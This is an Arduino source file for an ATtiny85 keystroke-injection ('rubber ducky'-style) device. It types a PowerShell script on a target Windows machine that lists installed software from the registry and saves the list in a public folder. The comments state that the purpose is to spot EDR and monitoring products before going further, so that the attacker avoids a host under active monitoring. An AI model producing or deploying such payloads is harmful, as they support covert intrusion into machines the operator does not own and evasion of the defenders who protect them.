// recon/software - Tier 2
//
// Installed software inventory.
//
// CrowdStrike, Velociraptor, Kaseya or Rapid7 on a machine that should
// not have them is a headline finding. Reading this first avoids poking a
// host under active monitoring.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "$p=@('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*')"
    "Get-ItemProperty $p -EA 0|Where-Object DisplayName|Select DisplayName,DisplayVersion,Publisher,InstallDate|Sort DisplayName|Format-Table -Auto|Out-String -Width 200"
    R_OUT("software.txt")
    R_SHOW("software.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
